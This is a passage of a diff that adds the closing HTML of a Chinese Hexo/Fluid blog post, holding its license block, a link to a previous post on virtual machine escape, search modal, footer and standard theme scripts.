+          <div>Epiphany</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年6月22日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/06/22/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%80%83%E9%80%B8%EF%BC%88%E4%BA%8C%EF%BC%89/" title="虚拟机逃逸（二）">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">虚拟机逃逸（二）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
